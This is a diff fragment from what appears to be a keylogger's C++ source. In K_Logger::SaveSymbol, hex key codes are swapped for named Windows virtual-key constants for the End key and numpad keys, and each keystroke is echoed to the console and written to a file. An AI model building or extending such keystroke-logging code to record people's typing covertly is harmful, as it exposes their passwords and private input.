@@ -562,7 +562,7 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("  *F12*  ");
 			break;
 
-		case 0x23:
+		case VK_END:
 			std::cout << "  *END*  ";
 			WriteToFile("  *END*  ");
 			break;
@@ -588,77 +588,77 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
 		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-		case 0x60:
+		case VK_NUMPAD0:
 			std::cout << "0";
 			WriteToFile("0");
 			break;
 
-		case 0x61:
+		case VK_NUMPAD1:
 			std::cout << "1";
 			WriteToFile("1");
 			break;
 
-		case 0x62:
+		case VK_NUMPAD2:
 			std::cout << "2";
 			WriteToFile("2");
 			break;
 
-		case 0x63:
+		case VK_NUMPAD3:
 			std::cout << "3";
 			WriteToFile("3");
 			break;
 
-		case 0x64:
+		case VK_NUMPAD4:
 			std::cout << "4";
 			WriteToFile("4");
 			break;
 
-		case 0x65:
+		case VK_NUMPAD5:
 			std::cout << "5";
 			WriteToFile("5");
 			break;
 
-		case 0x66:
+		case VK_NUMPAD6:
 			std::cout << "6";
 			WriteToFile("6");
 			break;
 
-		case 0x67:
+		case VK_NUMPAD7:
 			std::cout << "7";
 			WriteToFile("7");
 			break;
 
-		case 0x68:
+		case VK_NUMPAD8:
 			std::cout << "8";
 			WriteToFile("8");
 			break;
 
-		case 0x69:
+		case VK_NUMPAD9:
 			std::cout << "9";
 			WriteToFile("9");
 			break;
 
-		case 0x6E:
+		case VK_DECIMAL:
 			std::cout << ".";
 			WriteToFile(".");
 			break;
 
-		case 0x6D:
+		case VK_SUBTRACT:
 			std::cout << "-";
 			WriteToFile("-");
 			break;
 
-		case 0x6A:
+		case VK_MULTIPLY:
 			std::cout << "*";
 			WriteToFile("*");
 			break;
 
-		case 0x6F:
+		case VK_DIVIDE:
 			std::cout << "/";
 			WriteToFile("/");
 			break;
 
-		case 0x6B:
+		case VK_ADD:
 			std::cout << "+";
 			WriteToFile("+");
 			break;
